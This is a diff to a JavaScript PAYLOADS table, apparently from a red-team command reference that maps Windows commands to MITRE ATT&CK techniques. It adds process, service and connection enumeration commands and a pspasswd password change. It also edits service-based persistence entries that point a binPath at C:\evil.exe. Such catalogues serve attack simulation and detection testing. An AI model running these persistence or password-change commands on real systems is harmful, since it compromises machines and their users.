@@ -677,6 +677,14 @@ const PAYLOADS = {
             'lolbas': null,
             'desc': 'The command enumerates network adapter and interface information.',
         },
+        'Tcpvcon': {
+            'cmd': 'tcpvcon -a',
+            'cli': null,
+            'adminRequired': false,
+            'mitre': null,
+            'lolbas': null,
+            'desc': 'The command enumerates all TCP connections for each process.',
+        },
         'Type (hosts)': {
             'cmd': 'type C:\\Windows\\System32\\drivers\\etc\\hosts',
             'cli': null,
@@ -687,6 +695,14 @@ const PAYLOADS = {
         },
     },
     'Enumerate Processes': {
+        'PowerShell (Get-CimInstance)': {
+            'cmd': 'Get-CimInstance -Query \'Select * from Win32_Process\'',
+            'cli': 'PowerShell',
+            'adminRequired': false,
+            'mitre': {'id': 'T1057', 'url': 'https://attack.mitre.org/techniques/T1057/'},
+            'lolbas': null,
+            'desc': 'The command enumerates running processes.'
+        },
         'PowerShell (Get-Process)': {
             'cmd': 'Get-Process',
             'cli': 'PowerShell',
@@ -737,8 +753,16 @@ const PAYLOADS = {
             'lolbas': null,
             'desc': 'The command enumerates running services.',
         },
+        'Psservice': {
+            'cmd': 'psservice query -s active',
+            'cli': null,
+            'adminRequired': false,
+            'mitre': {'id': 'T1007', 'url': 'https://attack.mitre.org/techniques/T1007/'},
+            'lolbas': null,
+            'desc': 'The command enumerates running services.',
+        },
         'Sc': {
-            'cmd': 'sc query',
+            'cmd': 'sc.exe query',
             'cli': null,
             'adminRequired': false,
             'mitre': {'id': 'T1007', 'url': 'https://attack.mitre.org/techniques/T1007/'},
@@ -1028,6 +1052,14 @@ const PAYLOADS = {
             'mitre': null,
             'lolbas': null,
             'desc': 'The command creates a XML file that contains arbitrary command, then execute the command.',
+        },
+        'PowerShell (Start-Job)': {
+            'cmd': '$Job = Start-Job {Write-Host "Hello!"};Wait-Job -Job $Job;Receive-Job -Job $Job;Remove-Job -Job $Job',
+            'cli': 'PowerShell',
+            'adminRequired': false,
+            'mitre': null,
+            'lolbas': null,
+            'desc': 'The command creates a new job to execute command, then receive the result and remove it.',
         },
         'Rundll32 (Shell32)': {
             'cmd': 'rundll32 shell32.dll,ShellExec_RunDLL "cmd.exe" "/c echo hello > hello.txt"',
@@ -1395,6 +1427,14 @@ const PAYLOADS = {
             'lolbas': null,
             'desc': 'The command changes the current computer name. The system need to restart to apply the change.',
         },
+        'Pspasswd': {
+            'cmd': 'pspasswd John Password123',
+            'cli': null,
+            'adminRequired': false,
+            'mitre': null,
+            'lolbas': null,
+            'desc': 'The command changes the user\'s password.',
+        },
     },
     'Masquerade': {
         'Copy': {
@@ -1527,7 +1567,7 @@ const PAYLOADS = {
             'desc': 'The command makes the evil.exe to be executed when logon.',
         },
         'Sc (Config)': {
-            'cmd': 'sc config "Service Name" binPath= "C:\\evil.exe"',
+            'cmd': 'sc.exe config "Service Name" binPath= "C:\\evil.exe"',
             'cli': null,
             'adminRequired': true,
             'mitre': {'id': 'T1569.002', 'url': 'https://attack.mitre.org/techniques/T1569/002/'},
@@ -1535,7 +1575,7 @@ const PAYLOADS = {
             'desc': 'The command modifies the binary path of the existing service. It may achieve persistence.',
         },
         'Sc (Create)': {
-            'cmd': 'sc create Evil binPath="C:\\evil.exe" start= auto',
+            'cmd': 'sc.exe create Evil binPath="C:\\evil.exe" start= auto',
             'cli': null,
             'adminRequired': true,
             'mitre': {'id': 'T1569.002', 'url': 'https://attack.mitre.org/techniques/T1569/002/'},
